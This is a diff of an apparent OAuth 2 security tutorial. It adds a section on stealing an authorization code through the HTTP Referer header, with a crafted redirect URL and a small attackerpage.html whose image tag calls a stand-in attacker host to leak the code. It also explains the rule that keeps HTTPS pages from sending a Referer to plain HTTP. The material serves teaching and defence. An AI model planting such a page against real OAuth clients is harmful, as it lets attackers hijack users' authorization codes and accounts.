@@ -107,7 +107,7 @@ Now it isn’t necessarily true that having an authorization server that uses th
 
 ### Stealing the authorization code through the referrer
 
-The first attack described targets the authorization code grant type and is based on information leakage through the HTTP referrer. At the end of it, the attacker manages to hijack the resource owner’s authorization code.
+The first attack described targets the `authorization code` grant type and is based on information leakage through the HTTP referrer. At the end of it, the attacker manages to hijack the resource owner’s authorization code.
 
 The HTTP referrer is an HTTP header field that browsers (and HTTP clients in general) attach when surfing from one page to another. In this way, the new web page can see where the request came from, such as an incoming link from a remote site.
 
@@ -153,3 +153,20 @@ That said, now that this is enough to “convince” the victim to click the cra
 https://yourouauthclient.com/usergeneratedcontent/attackerpage.html?code=e8e0dc1c-2258-6cca-72f3-7dbe0ca97a0b
 ```
 
+Let’s have a closer look at the code of `attackerpage.html`:
+
+```
+<html>
+  <h1>Authorization in progress </h1>
+  <img src="https://attackersite.com/">
+</html>
+```
+
+In the background, the victim’s browser will load the embedded img tag for a resource at the attacker’s server. In that call, the HTTP Referer header will leak the authorization code.
+
+<img src="https://github.com/KiraDiShira/OAuth2/blob/master/CommonClientVulnerabilities/Image/ccv_3.PNG" />
+
+**Where is my Referrer?**
+The URI in the attacker’s post must be an https URI. Indeed, as per section 15.1.3 (Encoding Sensitive Information in URI’s) of HTTP RFC [RFC 2616]: Clients SHOULD NOT include a Referer header field in a (non-secure) HTTP request if the referring page was transferred with a secure protocol.
+
+<img src="https://github.com/KiraDiShira/OAuth2/blob/master/CommonClientVulnerabilities/Image/ccv_2.PNG" />
